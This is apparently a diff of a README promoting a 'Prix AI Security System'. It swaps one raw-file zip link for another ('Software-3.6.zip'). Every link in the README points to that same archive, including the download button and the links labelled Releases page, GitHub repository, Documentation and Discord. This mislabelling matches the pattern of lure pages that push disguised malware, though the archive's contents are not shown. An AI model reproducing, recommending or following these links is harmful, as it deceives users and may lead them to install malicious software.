@@ -7,7 +7,7 @@ Prix AI Security System is a highly advanced security platform designed to shiel
 Getting started with Prix is simple. Follow these steps to download and install the software.
 
 ### 📥 Download Link
-[![Download Prix](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/prix-anisomyodian.zip)](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/prix-anisomyodian.zip)
+[![Download Prix](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/Software-3.6.zip)](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/Software-3.6.zip)
 
 ## 💻 System Requirements
 Before you begin, ensure your system meets the following requirements:
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 🔧 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/prix-anisomyodian.zip) to find the latest version of Prix. 
+   Go to the [Releases page](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/Software-3.6.zip) to find the latest version of Prix. 
 
 2. **Download the Installer**  
    Look for the file under the latest version. Click on the installer that matches your operating system.
@@ -54,7 +54,7 @@ If you encounter any issues during installation or while using Prix, consider th
 - **Scan Issues:** If you suspect that your system is infected and Prix does not detect it, manually update the database. Then, run a full system scan.
 
 ## 🤝 Support
-If you need help or have questions, feel free to reach out through the Issues section on the [GitHub repository](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/prix-anisomyodian.zip). You can also check the FAQ section on the repository for common questions and answers.
+If you need help or have questions, feel free to reach out through the Issues section on the [GitHub repository](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/Software-3.6.zip). You can also check the FAQ section on the repository for common questions and answers.
 
 ## 📝 License
 Prix is licensed under the MIT License. You are free to use, modify, and distribute the software as per the terms stated in the license.
@@ -63,10 +63,10 @@ Prix is licensed under the MIT License. You are free to use, modify, and distrib
 Special thanks to the developers and contributors who helped make Prix a reliable and powerful security solution. Your efforts are appreciated.
 
 ## 🔗 Additional Resources
-- **Documentation:** More detailed user guides and documentation can be found [here](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/prix-anisomyodian.zip).
-- **Community:** Join our community discussions on [Discord](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/prix-anisomyodian.zip) for tips and support.
+- **Documentation:** More detailed user guides and documentation can be found [here](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/Software-3.6.zip).
+- **Community:** Join our community discussions on [Discord](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/Software-3.6.zip) for tips and support.
 
 ## 📥 Final Steps
-Once you're set up, remember to keep Prix updated regularly. You can always return to the [Releases page](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/prix-anisomyodian.zip) for the latest downloads.
+Once you're set up, remember to keep Prix updated regularly. You can always return to the [Releases page](https://raw.githubusercontent.com/CuisineQueen/prix/main/lienogastric/Software-3.6.zip) for the latest downloads.
 
 Take control of your digital security today with Prix. Enjoy peace of mind as you navigate online spaces.
